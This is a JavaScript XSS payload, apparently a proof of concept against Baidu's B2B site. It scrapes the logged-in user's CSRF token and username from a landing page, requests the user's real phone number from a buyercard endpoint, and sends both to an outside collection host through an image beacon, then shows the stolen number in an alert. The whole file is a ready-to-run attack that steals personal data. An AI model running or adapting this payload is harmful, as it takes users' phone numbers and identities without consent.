const apiUrl = 'https://b2b.baidu.com/land?url=https%3A%2F%2Fb2bwork.baidu.com';

// 发起 fetch 请求
fetch(apiUrl)
        .then(response => {
        // 检查响应状态是否正常
        if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
        }
        // 将响应内容以文本形式返回
        return response.text();
})
        .then(data => {
        // 定义正则表达式，用于匹配 CSRF 令牌
        // alert(data);
        const regex = /"csrf_token":"([^"]+)"/;
        const username_regex=/"userName":"([^"]+)"/;
        const match = data.match(regex);
        const username_match = data.match(username_regex);
        // alert(match);
        // alert(username_match);

        if (match) {
            // 从匹配结果中提取 CSRF 令牌
            const csrfToken = match[1];        
            const username = username_match[1];
            console.log('找到的 CSRF 令牌:', csrfToken);
            // 获取手机号目标接口的 URL
            const apiUrl = 'https://b2b.baidu.com/buyercard/getTelNumberAjax?ajax=1&logid=0&csrf_token='+csrfToken;

            // 使用 fetch 发起请求
            fetch(apiUrl)
                .then(response => {
                            // 检查响应状态是否正常
                            if (!response.ok) {
                                    throw new Error(`HTTP error! status: ${response.status}`);
                            }
                            // 将响应内容解析为 JSON 格式
                            return response.json();
                    })
                .then(data => {
                            // 检查响应 JSON 中是否存在 data 字段
                            if (data && data.data) {
                                    var hijacking_data = "useranme="+username+"&phone="+data.data.phone
                                    var remote_url = "http://baidu.haku.eyes.sh/hijacking?"+hijacking_data;
                                    new Image().src = remote_url;
                                    alert('xss获取到用户'+username+'真实手机号:'+data.data.phone);
                                    console.log('xss获取到用户真实手机号:', data.data.phone);
                            } else {
                                    console.log('响应中未找到 data 字段');
                            }
                    })
                .catch(error => {
                            // 捕获并处理请求过程中出现的错误
                            console.error('请求出错:', error);
                    });
        } else {
                console.log('未找到 CSRF 令牌');
        }
})
        .catch(error => {
        // 捕获并处理请求过程中出现的错误
        console.error('请求出错:', error);
});




